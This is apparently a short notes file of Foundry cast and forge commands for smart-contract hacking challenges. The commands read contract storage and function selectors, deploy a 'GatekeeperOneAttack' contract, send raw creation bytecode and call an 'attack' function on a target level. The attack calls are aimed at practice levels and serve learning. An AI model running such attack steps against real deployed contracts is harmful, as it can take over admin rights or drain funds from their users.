# commands

# ----- 0 -----
cast selectors $(cast code --rpc-url $RPC $LV)
curl -s "https://api.openchain.xyz/signature-database/v1/lookup?function=0xa9059cb" | jq -r '.result.function[] | .[].name'
cast keccak "approveNewAdmin(address)" | cut -c 1-10


# ----- 1 -----
cast storage --rpc-url $RPC $LV 0
cast parse-bytes32-address $(cast storage --rpc-url $RPC $LV 1)


# ----- 2 -----
forge create contracts/src/attacks/GatekeeperOneAttack_2.sol:GatekeeperOneAttack_2 --rpc-url $RPC --private-key $PK --constructor-args $LV
cast send --rpc-url $RPC --private-key $PK --create 68602a601f5360205ff360b81b5f5260095ff3


# ----- 3 -----
cast call --rpc-url $RPC $LV "balanceOf(address)" $ADR
cast send --rpc-url $RPC --private-key $PK $CON1 "attack(address,address)" $LV $ADR


# ----- 4 -----
cast run --debug $TX_HASH